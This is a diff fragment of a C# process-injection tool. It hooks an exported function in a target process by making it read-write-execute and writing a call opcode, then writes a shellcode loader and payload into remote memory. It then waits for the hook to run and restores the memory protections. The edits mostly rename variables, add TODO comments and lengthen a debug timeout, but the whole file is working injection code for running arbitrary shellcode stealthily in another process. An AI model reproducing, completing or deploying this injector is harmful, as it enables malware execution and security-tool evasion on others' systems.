@@ -239,7 +239,7 @@ internal static class Program
             exportAddress,
             8,
             MemoryProtection.ExecuteReadWrite,
-            out var oldProtect);
+            out var oldProtectHook);
 
         var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
         var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };
@@ -260,16 +260,17 @@ internal static class Program
             Console.WriteLine($"[!] Failed to write callOpCode: {status}");
             return;
         }
+        // TODO Avoid RWX on hooked function.  Hook assembly will need to handle VirtualProtect calls.
+        // TODO change mem prot of hook back here, already
 
         var payload = ShellcodeLoader.Concat(shellcode).ToArray();
-        //WriteProcessMemory(hProcess, (IntPtr)loaderAddress, payload, payload.Length, out _);
 
         status = ProtectVirtualMemory(
             hProcess,
             (IntPtr)loaderAddress,
             (uint)payload.Length,
             MemoryProtection.ReadWrite,
-            out oldProtect);
+            out var oldProtectLoader);
 
         if (status != NTSTATUS.Success)
         {
@@ -293,7 +294,7 @@ internal static class Program
             hProcess,
             (IntPtr)loaderAddress,
             (uint)payload.Length,
-            oldProtect,
+            oldProtectLoader,
             out _);
         
         if (status != NTSTATUS.Success)
@@ -303,12 +304,13 @@ internal static class Program
         }
 
         var timer = new Stopwatch();
+        int timeout = 60*60; // or 60*60 for debugging, TODO return to 60
         timer.Start();
         var executed = false;
 
         Console.WriteLine("[+] Shellcode injected, Waiting 60s for the hook to be called");
 
-        while (timer.Elapsed.TotalSeconds < 60)
+        while (timer.Elapsed.TotalSeconds < timeout)
         {
             var bytesToRead = 8;
             var buf = Marshal.AllocHGlobal(bytesToRead);
@@ -337,11 +339,11 @@ internal static class Program
 
         if (executed)
         {
-            ProtectVirtualMemory(
+            ProtectVirtualMemory( // TODO: Avoid RWX on hooked function. Hook assembly will need to handle VirtualProtect calls.
                 hProcess,
                 exportAddress,
                 8,
-                oldProtect,
+                oldProtectHook,
                 out _);
 
             FreeVirtualMemory(
